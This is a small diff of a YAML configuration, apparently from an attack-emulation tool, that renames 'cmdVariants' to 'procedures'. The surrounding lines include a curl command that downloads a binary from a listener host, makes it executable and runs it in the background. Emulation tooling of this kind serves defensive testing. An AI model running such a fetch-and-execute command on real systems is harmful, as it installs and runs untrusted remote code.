@@ -21,7 +21,7 @@ args:
   DST_BIN: "/tmp/pause"
 # command: "StartListener"
 # effects: ["ListenerReady"]
-cmdVariants:
+procedures:
   - key: curl
     command: curl -L ${LISTENER}:${FILESHARE_PORT}/${SRC_BIN} -o ${DST_BIN}  && chmod +x ${DST_BIN} && ${DST_BIN} &
   - key: wget
